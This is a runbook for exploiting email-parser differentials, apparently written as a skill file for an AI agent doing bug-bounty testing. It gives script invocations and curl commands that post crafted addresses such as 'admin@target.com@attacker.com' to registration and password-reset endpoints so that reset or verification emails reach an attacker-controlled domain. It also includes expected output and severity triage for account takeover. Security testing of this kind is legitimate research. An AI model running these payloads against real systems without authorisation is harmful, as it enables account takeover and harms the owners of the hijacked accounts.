# Email Parser Bypass Runbook

## Purpose
Exploit email parser differentials between the frontend web application (registration, password reset) and the backend SMTP delivery system. Different email parsers interpret ambiguous email formats differently — sending password resets or invitations to attacker-controlled addresses while appearing valid to the frontend.

Based on PortSwigger "Splitting the email atom" research and known RFC ambiguity exploits.

## Prerequisites
- Target has user registration, password reset, or invitation system
- Python 3.9+ with `requests` library
- Attacker-controlled email (for confirmation) or OAST domain for detection

## Variables
| Variable | Description |
|----------|-------------|
| `TARGET` | Target base URL |
| `OUTDIR` | Output directory |
| `ATTACKER_EMAIL_DOMAIN` | Your controlled domain(s) (e.g., interactsh for OAST) |

## Commands

### 1. Full Email Parser Bypass Probe (Auto-discovery)
```bash
python3 .claude/skills/http-protocol/scripts/email_parser_bypass.py \
  --context .bb/context.json \
  --target https://TARGET \
  --output $OUTDIR/http-protocol/email-parser/bypass_findings.jsonl
```

### 2. Targeted Registration Endpoint
```bash
python3 .claude/skills/http-protocol/scripts/email_parser_bypass.py \
  --context .bb/context.json \
  --target https://TARGET \
  --registration-endpoint /register \
  --output $OUTDIR/http-protocol/email-parser/bypass_findings.jsonl
```

### 3. Targeted Password Reset Endpoint
```bash
python3 .claude/skills/http-protocol/scripts/email_parser_bypass.py \
  --context .bb/context.json \
  --target https://TARGET \
  --password-reset-endpoint /forgot-password \
  --output $OUTDIR/http-protocol/email-parser/bypass_findings.jsonl
```

### 4. Manual Test — Encoded @ Sign
```bash
curl -s -X POST "https://TARGET/register" \
  -d "username=bypass_test1&email=admin%40attacker.com&password=TestPassword123!" \
  -o /dev/null -w "Status: %{http_code}\n" -D $OUTDIR/http-protocol/email-parser/headers1.txt
```

### 5. Manual Test — Quoted Local-Part
```bash
curl -s -X POST "https://TARGET/register" \
  -d 'username=bypass_test2&email="admin@target.com"@attacker.com&password=TestPassword123!' \
  -o /dev/null -w "Status: %{http_code}\n"
```

### 6. Manual Test — Multiple @ Signs
```bash
curl -s -X POST "https://TARGET/forgot-password" \
  -d "email=admin@target.com@attacker.com" \
  -o /dev/null -w "Status: %{http_code}\n"
```

## Expected Output

### Payload accepted by server:
```json
{
  "endpoint": "/forgot-password",
  "endpoint_category": "password_reset",
  "crafted_email": "admin@target.com@attacker.com",
  "test_name": "double_at_different_backend",
  "status_code": 200,
  "accepted": true,
  "accepted_by_server": true,
  "success_reflection": "...check your email..."
}
```

## Triage Guide

| Result | Action |
|--------|--------|
| `accepted_by_server: true` for any payload | Server parsed email — check if it routed to wrong domain via manual follow-up |
| Multiple `accepted_by_server` across different endpoints | Multiple attack surfaces — test each with actual email domain |
| Status 200 but response says "not found" | Email format rejected by business logic, not parser — try different variations |
| All payloads rejected with validation errors | Server validates email strictly — test for parser differential at SMTP level instead |
| `null_byte_truncation` accepted | Critical by itself — null byte truncation enables arbitrary email injection |

## Critical Findings Require Manual Follow-up:
1. **Password reset accepted with alternate domain** — confirm email arrived at attacker inbox
2. **Registration accepted** — confirm activation/verification email went to attacker domain
3. **Invitation accepted** — confirm invitation email arrives at attacker-controlled address

## Severity:
- Password reset to attacker email: **Critical** (Account Takeover)
- Registration with attacker domain: **High** (May escalate to admin-equivalent)
- Email validation bypass (no delivery differential): **Medium**
